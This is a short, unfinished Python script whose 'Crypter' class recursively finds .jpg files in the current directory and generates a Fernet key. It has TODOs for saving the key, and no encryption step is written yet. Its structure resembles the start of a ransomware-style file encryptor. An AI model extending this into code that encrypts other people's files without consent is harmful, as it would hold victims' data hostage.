import os
from typing import List, Union, Optional

from pathlib import Path, PosixPath, WindowsPath
from cryptography.fernet import Fernet


class Crypter:

    encrypt_ext = (".jpg",)

    def run(self):
        self.locate_files()

    def locate_files(self) -> List[Optional[Union[PosixPath, WindowsPath]]]:
        file_paths = []
        for dirpath, dirnames, filenames in os.walk("."): # TODO: pass folder by args
            for filename in filenames:
                _, file_ext = os.path.splitext(filename)
                if file_ext.lower() in self.encrypt_ext:
                    file_path = Path(f"{dirpath}/{filename}")
                    file_paths.append(file_path)
        return file_paths

    def generate_key(self):
        key = Fernet.generate_key()
        # TODO: Save in a .key file

if __name__ == "__main__":
    crypter = Crypter()
    crypter.run()